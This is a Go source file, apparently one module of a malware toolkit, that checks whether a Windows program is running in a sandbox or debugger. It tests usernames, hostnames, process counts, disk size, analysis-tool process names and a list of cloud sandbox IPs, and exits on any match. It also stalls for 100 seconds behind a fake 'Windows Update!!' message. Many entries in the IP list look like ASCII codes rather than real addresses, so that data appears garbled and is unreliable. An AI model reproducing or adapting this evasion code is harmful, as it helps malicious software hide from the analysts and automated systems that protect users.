package sandbox

import (
	"fmt"
	"net"
	"os"
	"os/user"
	"path/filepath"
	"regexp"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

//直接抄过来的，还未改造
type PROCESSENTRY32 struct {
	dwSize              uint32
	cntUsage            uint32
	th32ProcessID       uint32
	th32DefaultHeapID   uintptr
	th32ModuleID        uint32
	cntThreads          uint32
	th32ParentProcessID uint32
	pcPriClassBase      int32
	dwFlags             uint32
	szExeFile           [260]uint16
}

var (
	kernel322                = syscall.NewLazyDLL("kernel32.dll")
	CreateToolhelp32Snapshot = kernel322.NewProc("CreateToolhelp32Snapshot")
	Process32First           = kernel322.NewProc("Process32FirstW")
	Process32Next            = kernel322.NewProc("Process32NextW")
	CloseHandle              = kernel322.NewProc("CloseHandle")
)

var (
	//在此处添加沙箱常见用户名
	userNames = []string{
		"John", "Phil", "Abby", "george", "katiehall", "kovalev", "WALKER", "elz", "makarov",
	}
	//在此处添加沙箱常见主机名
	hostNames = []string{
		"John", "Jason", "WALKER-PC",
	}
	//正则匹配主机名
	hostNamesRex = []string{
		"^\\d\\d\\d\\d\\d\\d$", `^[A-Z][A-Z][A-Z][A-Z][A-Z][A-Z][A-Z][A-Z]$`,
	}
	//添加常见云沙箱、云分析ip
	hostIP = []string{
		"77.79.82.9", "66.79.83.9", "73.78.9.50", "79.75.73.78", "79.104.209.127", "82.69.9.57", "73.65.90.9", "72.90.9.57", "69.76.65.9", "65.9.56.57", "65.86.73.9", "194.154.78.69", "194.154.78.248", "79.66.9.49", "90.9.48.51", "82.79.75.9", "79.83.9.54", "79.76.69.66", "78.65.9.49", "77.83.9.57", "75.9.50.56", "73.75.9.49", "72.90.9.54", "72.90.9.49", "69.76.9.50", "68.69.70.9", "213.33.190.251", "89.82.9.54", "86.73.9.55", "86.73.9.49", "83.9.56.53", "76.85.75.9", "213.33.190.241", "212.119.227.136", "194.186.142.17", "194.154.78.201", "73.75.9.50", "65.84.9.51", "213.33.190.184", "79.104.209.149", "82.79.9.54", "73.82.71.9", "66.69.76.9", "82.69.83.9", "68.69.77.9", "213.33.190.158", "194.154.78.190", "79.104.209.5", "194.186.142.175", "72.73.77.9", "79.83.9.55", "78.9.49.48", "77.79.75.9", "213.33.190.190", "212.119.227.176", "79.104.209.136", "90.9.49.51", "66.9.52.50", "79.104.209.64", "75.73.78.9", "65.68.9.54", "194.186.142.252", "79.83.9.48", "194.186.142.168", "82.79.66.9", "76.65.9.57", "194.186.142.241", "79.104.209.58", "83.9.50.48", "79.68.69.70", "76.65.9.55", "213.33.190.146", "213.33.190.185", "79.104.209.4", "79.104.209.192", "72.65.90.9", "195.239.51.117", "78.65.9.54", "79.104.209.221", "78.9.57.51", "71.9.49.57", "86.73.9.50", "85.72.90.9", "82.70.9.57", "194.186.142.247", "213.33.190.217", "194.186.142.1", "82.75.9.53", "79.82.9.50", "79.78.9.51", "194.154.78.196", "85.79.76.69", "82.75.9.56", "79.80.9.51", "65.84.9.49", "213.33.190.115", "212.119.227.167", "212.119.227.133", "195.239.51.2", "194.186.142.124", "106.13.191.192", "212.113.7.204", "194.68.170.57",
	}
)

//获取公网 ip
func GetOutBoundIP() (ip string, err error) {
	conn, err := net.Dial("udp", "8.8.8.8:53")
	if err != nil {
		fmt.Println(err)
		return
	}
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	fmt.Println(localAddr.String())
	ip = strings.Split(localAddr.String(), ":")[0]
	return
}

func checkIP(param interface{}) (code int) {
	hostIP, err := GetOutBoundIP()
	if err != nil {
		return 1
	}
	ipList, ok := param.([]string)
	if !ok {
		//fmt.Println("slice of ip must be []string")
		return 1
	}
	for _, ip := range ipList {
		if strings.Contains(strings.ToLower(hostIP), strings.ToLower(ip)) {
			return 0
		}
	}
	return -1
}

func checkUserName(param interface{}) (code int) {
	username, err := user.Current()
	if err != nil {
		return 1
	}
	names, ok := param.([]string)
	if !ok {
		//fmt.Println("user names must be []string")
		return 1
	}
	for _, name := range names {
		if strings.Contains(strings.ToLower(username.Username), strings.ToLower(name)) {
			return 0
		}
	}
	//fmt.Printf("1.UserName OK!\n")
	return -1
}

func checkDebugger(param interface{}) (code int) {
	var kernel32, _ = syscall.LoadLibrary("kernel32.dll")
	var IsDebuggerPresent, _ = syscall.GetProcAddress(kernel32, "IsDebuggerPresent")
	var nargs uintptr = 0

	if debuggerPresent, _, err := syscall.Syscall(uintptr(IsDebuggerPresent), nargs, 0, 0, 0); err != 0 {
		//fmt.Printf("Error determining whether debugger present.\n")
	} else {
		if debuggerPresent != 0 {
			return 0
		}
	}
	//fmt.Printf("2.Debugger OK!\n")
	return -1
}

func checkFileName(param interface{}) (code int) {
	length, ok := param.(int)
	if !ok {
		//fmt.Println("the length of filename must be integer")
		return 1
	}
	actualName := filepath.Base(os.Args[0])
	if len(actualName) >= length {
		return 0
	}
	//fmt.Printf("3.FileName OK!\n")
	return -1
}

func checkProcessNum(param interface{}) (code int) {
	minRunningProcesses, ok := param.(int)
	if !ok {
		//fmt.Println("the number of process must be integer")
		return 1
	}
	hProcessSnap, _, _ := CreateToolhelp32Snapshot.Call(2, 0)
	if hProcessSnap < 0 {
		return -1
	}
	defer CloseHandle.Call(hProcessSnap)

	exeNames := make([]string, 0, 100)
	var pe32 PROCESSENTRY32
	pe32.dwSize = uint32(unsafe.Sizeof(pe32))

	Process32First.Call(hProcessSnap, uintptr(unsafe.Pointer(&pe32)))

	for {

		exeNames = append(exeNames, syscall.UTF16ToString(pe32.szExeFile[:260]))

		retVal, _, _ := Process32Next.Call(hProcessSnap, uintptr(unsafe.Pointer(&pe32)))
		if retVal == 0 {
			break
		}

	}
	runningProcesses := 0
	for range exeNames {
		runningProcesses += 1
	}

	if runningProcesses < minRunningProcesses {
		return 0
	}
	//fmt.Printf("4.ProcessNum OK!\n")
	return -1
}

func checkDiskSize(param interface{}) (code int) {
	minDiskSizeGB, ok := param.(float32)
	if !ok {
		//fmt.Println("the size of disk must be float32")
		return 1
	}
	//var kernel323 = syscall.NewLazyDLL("kernel32.dll")
	var (
		getDiskFreeSpaceEx                                                   = kernel322.NewProc("GetDiskFreeSpaceExW")
		lpFreeBytesAvailable, lpTotalNumberOfBytes, lpTotalNumberOfFreeBytes int64
	)

	getDiskFreeSpaceEx.Call(
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("C:"))),
		uintptr(unsafe.Pointer(&lpFreeBytesAvailable)),
		uintptr(unsafe.Pointer(&lpTotalNumberOfBytes)),
		uintptr(unsafe.Pointer(&lpTotalNumberOfFreeBytes)))

	diskSizeGB := float32(lpTotalNumberOfBytes) / 1073741824
	//fmt.Println(diskSizeGB)
	if diskSizeGB < minDiskSizeGB {
		return 0
	}
	//fmt.Printf("5.DiskSize OK!\n")
	return -1
}
func checkHostName(param interface{}) (code int) {
	hosts, ok := param.([]string)
	if !ok {
		//fmt.Println("slice of hostname must be []string")
		return 1
	}
	hostname, errorout := os.Hostname()
	if errorout != nil {
		os.Exit(1)
	}
	for _, host := range hosts {
		if strings.Contains(strings.ToLower(hostname), strings.ToLower(host)) {
			return 0
		}
	}
	for _, reg := range hostNamesRex {
		reg1 := regexp.MustCompile(reg)
		if reg1 == nil {
			println("regexp err")
			return
		}
		if reg1.FindAllStringSubmatch(hostname, -1) != nil {
			return 0
		}
	}
	//fmt.Printf("7.HostName OK!\n")
	return -1
}

func checkBlacklist(param interface{}) (code int) {
	EvidenceOfSandbox := make([]string, 0)
	//在此处添加进程黑名单
	sandboxProcesses := [...]string{`sysdiag`, `sysdiag-gui`, `usysdiag`, `Dbgview`}
	hProcessSnap1, _, _ := CreateToolhelp32Snapshot.Call(2, 0)
	if hProcessSnap1 < 0 {
		return -1
	}
	defer CloseHandle.Call(hProcessSnap1)

	exeNames := make([]string, 0, 100)
	var pe32 PROCESSENTRY32
	pe32.dwSize = uint32(unsafe.Sizeof(pe32))

	Process32First.Call(hProcessSnap1, uintptr(unsafe.Pointer(&pe32)))

	for {

		exeNames = append(exeNames, syscall.UTF16ToString(pe32.szExeFile[:260]))

		retVal, _, _ := Process32Next.Call(hProcessSnap1, uintptr(unsafe.Pointer(&pe32)))
		if retVal == 0 {
			break
		}

	}

	for _, exe := range exeNames {
		for _, sandboxProc := range sandboxProcesses {
			if strings.Contains(strings.ToLower(exe), strings.ToLower(sandboxProc)) {
				EvidenceOfSandbox = append(EvidenceOfSandbox, exe)
			}
		}
	}

	if len(EvidenceOfSandbox) != 0 {
		return 0
	}
	//fmt.Printf("6.Blacklist OK!\n")
	return -1
}

func exec1(fn func(interface{}) int, param interface{}) {
	if code := fn(param); code >= 0 {
		os.Exit(code)
	}
}

func Check() {
	//反沙箱(选用)
	undo()
	//检测用户名
	exec1(checkUserName, userNames)
	//判断hostname是否为黑名单
	exec1(checkHostName, hostNames)
	//检测进程数量是否大于后面输入的数
	exec1(checkProcessNum, 50)
	//检测系统盘是否大于后面输入的数
	exec1(checkDiskSize, float32(60))
	//检测调试器
	exec1(checkDebugger, nil)
	//检测文件名长度是否大于后面输入的数
	exec1(checkFileName, 12)
	//判断进程名是否为黑名单
	exec1(checkBlacklist, nil)
	//判断是否存在黑名单ip
	exec1(checkIP, hostIP)
}

func undo() {
	//有些沙箱为了不损耗资源会给沙箱设置时间限制并销毁
	for i := 0; i < 100; i++ {
		fmt.Printf("Windows Update!!")
		time.Sleep(time.Duration(1) * time.Second)
	}
}
